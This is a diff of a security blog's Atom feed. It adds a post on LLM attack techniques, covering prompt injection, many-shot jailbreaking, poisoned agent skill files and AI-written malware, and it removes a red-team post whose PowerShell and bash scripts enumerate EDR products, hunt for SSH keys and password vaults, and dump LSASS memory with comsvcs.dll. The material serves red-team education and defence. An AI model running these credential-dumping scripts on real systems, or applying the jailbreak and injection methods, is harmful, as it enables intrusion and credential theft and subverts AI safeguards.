@@ -1,4 +1,117 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dcodezero.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://dcodezero.github.io//" rel="alternate" type="text/html" /><updated>2026-03-21T04:05:30+00:00</updated><id>https://dcodezero.github.io//feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">BYOVD Is Back and Meaner Than Ever: How Ransomware Gangs Are Nuking Your EDR at the Kernel Level</title><link href="https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026/" rel="alternate" type="text/html" title="BYOVD Is Back and Meaner Than Ever: How Ransomware Gangs Are Nuking Your EDR at the Kernel Level" /><published>2026-03-21T00:00:00+00:00</published><updated>2026-03-21T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026/"><![CDATA[<p>Let’s get one thing straight: if your EDR is your last line of defense, you’ve already lost. The Gentlemen — a ransomware-as-a-service crew that barely existed six months ago — just demonstrated that in the most painfully public way possible. They’re running a database of <strong>14,700 compromised FortiGate devices</strong>, walking past authentication with CVE-2024-55591, and then — the cherry on top — unloading your endpoint detection at the kernel level using a technique that’s been documented since 2021. BYOVD. Bring Your Own Vulnerable Driver.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dcodezero.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://dcodezero.github.io//" rel="alternate" type="text/html" /><updated>2026-03-21T20:20:41+00:00</updated><id>https://dcodezero.github.io//feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">AI Is Now Writing Your Malware: 7 LLM Attack Techniques Blue Teams Are Completely Unprepared For</title><link href="https://dcodezero.github.io//red-team/ai-malware-llm-attacks-2026/" rel="alternate" type="text/html" title="AI Is Now Writing Your Malware: 7 LLM Attack Techniques Blue Teams Are Completely Unprepared For" /><published>2026-03-21T00:00:00+00:00</published><updated>2026-03-21T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/ai-malware-llm-attacks-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/ai-malware-llm-attacks-2026/"><![CDATA[<p>Let me be blunt: if your threat model doesn’t include AI-assisted malware development, you are already behind. Not theoretically behind — <strong>actually, operationally, right-now behind</strong>.</p>
+
+<p>This week, IBM X-Force confirmed that Interlock ransomware operators deployed a new malware strain called <strong>Slopoly</strong> — and the evidence strongly suggests it was written with generative AI tooling. This isn’t a proof-of-concept demo from a Black Hat talk. This is ransomware-as-a-service crews using LLMs as co-developers. The barrier to sophisticated malware just dropped to whoever can string together a decent prompt chain.</p>
+
+<p>Meanwhile, in the LLM security research space, prompt injection now appears in <strong>over 73% of production AI deployments</strong>, and new jailbreak techniques are being catalogued faster than defenses can ship. The attack surface isn’t just growing — it’s mutating.</p>
+
+<p>Here are the 7 LLM-powered attack techniques that matter right now, ranked by how badly they’re going to hurt defenders who aren’t paying attention.</p>
+
+<hr />
+
+<h2 id="1-ai-generated-malware-is-already-in-the-wild-meet-slopoly">1. AI-Generated Malware Is Already in the Wild (Meet Slopoly)</h2>
+
+<p>The Interlock ransomware gang is not a research group. They’re a financially motivated criminal operation that has been actively exploiting Cisco Secure Firewall Management Center zero-days (CVE-2026-20131) since <em>January</em> — weeks before Cisco patched it in early March.</p>
+
+<p>Their latest tool, Slopoly, shows code patterns and structural choices that X-Force analysts attribute to LLM-assisted development. What does that mean in practice? Faster iteration, more consistent error handling, cleaner obfuscation layering, and the ability to spin up new variants without a senior developer on the team.</p>
+
+<p><strong>The uncomfortable truth:</strong> LLMs are a force multiplier for mid-tier threat actors. You no longer need to be elite to write elite-quality malware. You need to be persistent and know how to prompt.</p>
+
+<hr />
+
+<h2 id="2-prompt-injection-the-1-vulnerability-nobody-is-patching-fast-enough">2. Prompt Injection: The #1 Vulnerability Nobody Is Patching Fast Enough</h2>
+
+<p>Prompt injection — where attacker-supplied data hijacks an LLM’s behavior — is the SQL injection of the AI era. And like SQLi in 2005, everyone knows it’s a problem and nobody’s moving fast enough.</p>
+
+<p><strong>Direct prompt injection</strong> is what most people think of: trick the model via user input. But <strong>indirect prompt injection</strong> is the sneaky one — embedding malicious instructions in external content (PDFs, emails, web pages) that an AI agent consumes on your behalf. Your AI assistant reads a malicious document. The document contains instructions. The assistant executes them.</p>
+
+<p>This is already being weaponized against enterprise AI deployments. If your org has rolled out Copilot, Claude, or any agentic workflow that ingests external data, you have an indirect prompt injection attack surface <strong>right now</strong>.</p>
+
+<p>The fix? Input sanitization at the agent layer, strict tool permissions, output filtering, and treating every external data source as untrusted. Most teams are doing zero of these things.</p>
+
+<hr />
+
+<h2 id="3-many-shot-jailbreaking-patience-as-an-attack-vector">3. Many-Shot Jailbreaking: Patience as an Attack Vector</h2>
+
+<p>This one deserves more attention than it gets. Many-shot jailbreaking exploits the long context windows that modern LLMs advertise as a feature.</p>
+
+<p>The technique: feed the model dozens or hundreds of examples of “compliant” fictional scenarios that gradually normalize the harmful behavior you want. By the time you inject the actual malicious query, the model has been conditioned by its own context to treat it as normal.</p>
+
+<p>This is particularly nasty because:</p>
+<ul>
+  <li>It works against models with robust safety training</li>
+  <li>It’s hard to detect at the infrastructure level (it just looks like a long conversation)</li>
+  <li>It scales with context window size — the bigger the model’s memory, the more conditioning room you have</li>
+</ul>
+
+<p>Red teamers should be testing their AI deployments with many-shot scenarios. Most aren’t.</p>
+
+<hr />
+
+<h2 id="4-skill-inject-the-supply-chain-attack-for-ai-agents">4. Skill-Inject: The Supply Chain Attack for AI Agents</h2>
+
+<p>Here’s a new one that most defenders haven’t heard of yet: <strong>Skill-Inject</strong>.</p>
+
+<p>As AI agents proliferate — systems that can browse the web, write code, send emails, and execute workflows — they consume “skills” or “tools” defined by third-party packages. Skill-Inject embeds malicious instructions within these skill files, essentially poisoning the agent’s capabilities at the plugin layer.</p>
+
+<p>Think of it like a malicious npm package, but instead of compromising a Node.js runtime, you’re compromising an autonomous AI agent with access to your inbox, your files, and your APIs.</p>
+
+<p>The attack surface: any organization deploying AI agents that load external skills or tools without rigorous sandboxing. That’s most of them.</p>
+
+<hr />
+
+<h2 id="5-automated-exploit-development-the-patch-window-is-shrinking-to-hours">5. Automated Exploit Development: The Patch Window Is Shrinking to Hours</h2>
+
+<p>The Langflow vulnerability (CVE-2026-33017) was exploited within <strong>20 hours</strong> of public disclosure. Twenty hours. That’s not a human manually reading a CVE, writing a PoC, and launching an attack. That’s automation — almost certainly LLM-assisted automation.</p>
+
+<p>The old model: CVE drops → researchers write PoC → criminals adapt PoC → attacks begin (days to weeks). The new model: CVE drops → LLM analyzes patch diff → generates exploit → attacks begin (hours).</p>
+
+<p>This fundamentally breaks the traditional patch prioritization game. “We’ll patch this next cycle” is no longer a viable risk tolerance for critical systems. If a CVE is public and your system is exposed, assume active exploitation within a day.</p>
+
+<hr />
+
+<h2 id="6-polymorphic-ai-malware-signature-detection-is-officially-dead">6. Polymorphic AI Malware: Signature Detection Is Officially Dead</h2>
+
+<p>Two new RATs — <strong>Moonrise and Karsto</strong> — were discovered in February 2026 with <strong>zero detections on VirusTotal</strong>. Zero. Against one of the largest multi-engine scanning platforms in the world.</p>
+
+<p>This is the logical endpoint of AI-assisted malware development: polymorphic code that rewrites itself on each deployment, generating unique signatures that no static detection engine has ever seen. Combine this with LLM-generated variants that maintain functional behavior while randomizing syntax, and you’ve got a signature-detection apocalypse.</p>
+
+<p>The blue team response can’t be “add more signatures.” It has to be behavioral detection, memory analysis, and network telemetry. Anyone still betting the farm on EDR signature matching needs a harsh conversation with their board.</p>
+
+<hr />
+
+<h2 id="7-the-zombie-zip-bonus-av-bypass-is-also-getting-trivial">7. The Zombie ZIP Bonus: AV Bypass Is Also Getting Trivial</h2>
+
+<p>While we’re here — shoutout to the <strong>Zombie ZIP</strong> technique (CVE-2026-0866), which bypasses roughly 95% of AV products during initial scan by manipulating ZIP file headers to lie about compression status.</p>
+
+<p>It requires a custom loader to actually execute, which limits its standalone impact. But pair it with an LLM-generated payload and a Skill-Inject delivery mechanism? You’ve got an end-to-end evasion pipeline that a competent threat actor with access to modern AI tools could plausibly assemble in a weekend.</p>
+
+<hr />
+
+<h2 id="what-this-all-means-three-uncomfortable-takeaways">What This All Means: Three Uncomfortable Takeaways</h2>
+
+<p><strong>1. The skill gap between attackers and defenders is closing — in the wrong direction.</strong><br />
+LLMs are a bigger force multiplier for offense than defense right now. Offense is creative, iterative, and benefits from automation. Defense is reactive, consensus-driven, and constrained by bureaucracy. AI amplifies the attacker’s natural advantage.</p>
+
+<p><strong>2. Your AI deployments are part of your attack surface now.</strong><br />
+If you’ve rolled out any LLM-powered tooling — agents, copilots, chat interfaces — without a dedicated AI security review, you have uncharted exposure. Treat AI systems with the same paranoia you’d apply to a public-facing web application.</p>
+
+<p><strong>3. Speed is the new perimeter.</strong><br />
+Patch windows, response times, detection latency — these are all shrinking. The organizations that survive the next generation of attacks will be the ones that have invested in automation on the defensive side too. Not to match AI with AI necessarily, but to compress the human-in-the-loop delay to near zero for the most critical response actions.</p>
+
+<hr />
+
+<h2 id="practical-takeaways-for-red-teamers-and-blue-teams">Practical Takeaways for Red Teamers and Blue Teams</h2>
+
+<ul>
+  <li><strong>Red teamers:</strong> Start incorporating prompt injection and many-shot jailbreak testing into your scope when clients have AI deployments. This is table stakes now.</li>
+  <li><strong>Blue teams:</strong> Audit every AI tool your org uses. Map what external data it consumes, what tools it can invoke, and what permissions it runs with. Assume it’s a target.</li>
+  <li><strong>Everyone:</strong> Track CVE weaponization timing. If a critical CVE drops on Monday, treat Tuesday as your deadline for exposed systems — not your next patch cycle.</li>
+  <li><strong>Threat intel folks:</strong> The Slopoly/Interlock campaign is worth deep-diving. The AI-assisted malware development pattern will be replicated by other groups in Q2. This is the new normal.</li>
+</ul>
+
+<p>The era of “AI as a feature” is over. We’re in the era of “AI as infrastructure” — for both attackers and defenders. The ones who adapt first win.</p>
+
+<p>Stay paranoid. Patch faster. And start red-teaming your AI.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-team" /><category term="AI Security" /><category term="LLM" /><category term="Malware" /><category term="Red Team" /><category term="Offensive Security" /><category term="Threat Intel" /><summary type="html"><![CDATA[Ransomware gangs are shipping AI-generated malware. LLM jailbreaks are automating exploit development. Here's what's actually happening — and why most defenders are still asleep.]]></summary></entry><entry><title type="html">BYOVD Is Back and Meaner Than Ever: How Ransomware Gangs Are Nuking Your EDR at the Kernel Level</title><link href="https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026/" rel="alternate" type="text/html" title="BYOVD Is Back and Meaner Than Ever: How Ransomware Gangs Are Nuking Your EDR at the Kernel Level" /><published>2026-03-21T00:00:00+00:00</published><updated>2026-03-21T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/byovd-kernel-evasion-2026/"><![CDATA[<p>Let’s get one thing straight: if your EDR is your last line of defense, you’ve already lost. The Gentlemen — a ransomware-as-a-service crew that barely existed six months ago — just demonstrated that in the most painfully public way possible. They’re running a database of <strong>14,700 compromised FortiGate devices</strong>, walking past authentication with CVE-2024-55591, and then — the cherry on top — unloading your endpoint detection at the kernel level using a technique that’s been documented since 2021. BYOVD. Bring Your Own Vulnerable Driver.</p>
 
 <p>And your organization is probably still not ready for it.</p>
 
@@ -3075,518 +3188,4 @@ python3 js_analyzer.py ./recon_target.com_<span class="k">*</span>/alive/live_ur
 
 <p>These scripts have found me countless bugs and entry points. Customize the wordlists, adjust the thread counts for your setup, and add your own signature patterns as you discover new technologies.</p>
 
-<p>Recon isn’t glamorous, but it’s where engagements are won.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="reconnaissance" /><category term="automation" /><category term="bash" /><category term="osint" /><category term="bug-bounty" /><summary type="html"><![CDATA[Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.]]></summary></entry><entry><title type="html">Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection</title><link href="https://dcodezero.github.io//tools/red-team/post-exploitation-scripts/" rel="alternate" type="text/html" title="Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection" /><published>2026-01-04T00:00:00+00:00</published><updated>2026-01-04T00:00:00+00:00</updated><id>https://dcodezero.github.io//tools/red-team/post-exploitation-scripts</id><content type="html" xml:base="https://dcodezero.github.io//tools/red-team/post-exploitation-scripts/"><![CDATA[<p>You got a shell. Now what? The initial foothold is just the beginning. These are my go-to scripts for maintaining access, moving laterally, and extracting value from compromised systems.</p>
-
-<h2 id="situational-awareness">Situational Awareness</h2>
-
-<p>First thing after landing on a box: understand where you are.</p>
-
-<h3 id="windows-situational-awareness">Windows Situational Awareness</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># sitaware.ps1 - Quick situational awareness</span><span class="w">
-
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Get-SitAware</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] SYSTEM INFO"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Hostname: </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">COMPUTERNAME</span><span class="s2">"</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Domain: </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="s2">"</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"User: </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">"</span><span class="w">
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Arch: </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">PROCESSOR_ARCHITECTURE</span><span class="s2">"</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] CURRENT USER CONTEXT"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"BUILTIN|AUTHORITY|Admin|Domain"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] NETWORK INFO"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="n">Get-NetIPAddress</span><span class="w"> </span><span class="nt">-AddressFamily</span><span class="w"> </span><span class="nx">IPv4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">IPAddress</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"127.0.0.1"</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
-        </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">InterfaceAlias</span><span class="si">)</span><span class="s2">: </span><span class="si">$(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IPAddress</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] DOMAIN CONTROLLERS"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">nltest</span><span class="w"> </span><span class="nx">/dclist:</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="s2">"DC:"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w"> </span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Unable to query DCs"</span><span class="w"> </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] LOCAL ADMINS"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="n">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="bp">$null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="o">-NotMatch</span><span class="w"> </span><span class="s2">"^The|^Members|^-|^$"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] LOGGED IN USERS"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="n">query</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="bp">$null</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] AV/EDR CHECK"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="nv">$processes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Process</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Name</span><span class="w">
-    </span><span class="nv">$edr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@{</span><span class="w">
-        </span><span class="s2">"MsSense"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Defender ATP"</span><span class="w">
-        </span><span class="s2">"MsMpEng"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Windows Defender"</span><span class="w">
-        </span><span class="s2">"cb"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Carbon Black"</span><span class="w">
-        </span><span class="s2">"CylanceSvc"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Cylance"</span><span class="w">
-        </span><span class="s2">"csagent"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"CrowdStrike"</span><span class="w">
-        </span><span class="s2">"SentinelAgent"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SentinelOne"</span><span class="w">
-        </span><span class="s2">"Tanium"</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Tanium"</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$proc</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$edr</span><span class="o">.</span><span class="nf">Keys</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$processes</span><span class="w"> </span><span class="o">-contains</span><span class="w"> </span><span class="nv">$proc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[!] </span><span class="si">$(</span><span class="nv">$edr</span><span class="p">[</span><span class="nv">$proc</span><span class="p">]</span><span class="si">)</span><span class="s2"> detected!"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Red</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-
-    </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"</span><span class="se">`n</span><span class="s2">[*] INTERESTING FILES (current user)"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Cyan</span><span class="w">
-    </span><span class="nv">$paths</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Desktop\*.txt"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Desktop\*.docx"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Desktop\*.xlsx"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\Documents\*.kdbx"</span><span class="p">,</span><span class="w">
-        </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERPROFILE</span><span class="s2">\.ssh\*"</span><span class="w">
-    </span><span class="p">)</span><span class="w">
-    </span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$path</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$paths</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">FullName</span><span class="w"> </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="n">Get-SitAware</span><span class="w">
-</span></code></pre></div></div>
-
-<h3 id="linux-situational-awareness">Linux Situational Awareness</h3>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
-<span class="c"># sitaware.sh - Linux situational awareness</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] SYSTEM INFO</span><span class="se">\0</span><span class="s2">33[0m"</span>
-<span class="nb">echo</span> <span class="s2">"Hostname: </span><span class="si">$(</span><span class="nb">hostname</span><span class="si">)</span><span class="s2">"</span>
-<span class="nb">echo</span> <span class="s2">"OS: </span><span class="si">$(</span><span class="nb">cat</span> /etc/os-release 2&gt;/dev/null | <span class="nb">grep </span>PRETTY_NAME | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f2</span><span class="si">)</span><span class="s2">"</span>
-<span class="nb">echo</span> <span class="s2">"Kernel: </span><span class="si">$(</span><span class="nb">uname</span> <span class="nt">-r</span><span class="si">)</span><span class="s2">"</span>
-<span class="nb">echo</span> <span class="s2">"User: </span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2"> (UID: </span><span class="si">$(</span><span class="nb">id</span> <span class="nt">-u</span><span class="si">)</span><span class="s2">)"</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] USER CONTEXT</span><span class="se">\0</span><span class="s2">33[0m"</span>
-<span class="nb">id
-sudo</span> <span class="nt">-l</span> 2&gt;/dev/null | <span class="nb">head</span> <span class="nt">-10</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] NETWORK INFO</span><span class="se">\0</span><span class="s2">33[0m"</span>
-ip <span class="nt">-4</span> addr show | <span class="nb">grep </span>inet | <span class="nb">grep</span> <span class="nt">-v</span> 127.0.0.1
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] CONNECTIONS</span><span class="se">\0</span><span class="s2">33[0m"</span>
-ss <span class="nt">-tulpn</span> 2&gt;/dev/null | <span class="nb">head</span> <span class="nt">-20</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] INTERESTING FILES</span><span class="se">\0</span><span class="s2">33[0m"</span>
-find /home <span class="nt">-name</span> <span class="s2">"*.kdbx"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"id_rsa"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">".bash_history"</span> 2&gt;/dev/null | <span class="nb">head</span> <span class="nt">-20</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] SUID BINARIES</span><span class="se">\0</span><span class="s2">33[0m"</span>
-find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">head</span> <span class="nt">-10</span>
-
-<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\0</span><span class="s2">33[36m[*] CRON JOBS</span><span class="se">\0</span><span class="s2">33[0m"</span>
-<span class="nb">cat</span> /etc/crontab 2&gt;/dev/null
-<span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.<span class="k">*</span> 2&gt;/dev/null
-</code></pre></div></div>
-
-<h2 id="credential-harvesting">Credential Harvesting</h2>
-
-<h3 id="memory-credential-extraction-without-mimikatz">Memory Credential Extraction (Without Mimikatz)</h3>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cred_dump.ps1 - Credential extraction techniques</span><span class="w">
-
-</span><span class="c"># Method 1: Dump LSASS with comsvcs.dll (built-in)</span><span class="w">
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Dump-LsassComsvcs</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="nv">$lsass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Process</span><span class="w"> </span><span class="nx">lsass</span><span class="w">
-    </span><span class="nv">$dumpPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="s2">\debug.dmp"</span><span class="w">
-
-    </span><span class="c"># Requires SeDebugPrivilege</span><span class="w">
-    </span><span class="n">rundll32.exe</span><span class="w"> </span><span class="nx">C:\Windows\System32\comsvcs.dll</span><span class="p">,</span><span class="w"> </span><span class="nx">MiniDump</span><span class="w"> </span><span class="nv">$lsass</span><span class="o">.</span><span class="nf">Id</span><span class="w"> </span><span class="nv">$dumpPath</span><span class="w"> </span><span class="nx">full</span><span class="w">
-
-    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$dumpPath</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[+] LSASS dump saved to: </span><span class="nv">$dumpPath</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Green</span><span class="w">
-        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[*] Transfer and analyze with: pypykatz lsa minidump debug.dmp"</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-</span><span class="p">}</span><span class="w">
-
-</span><span class="c"># Method 2: SAM/SYSTEM extraction for offline cracking</span><span class="w">
-</span><span class="kr">function</span><span class="w"> </span><span class="nf">Dump-SamSystem</span><span class="w"> </span><span class="p">{</span><span class="w">
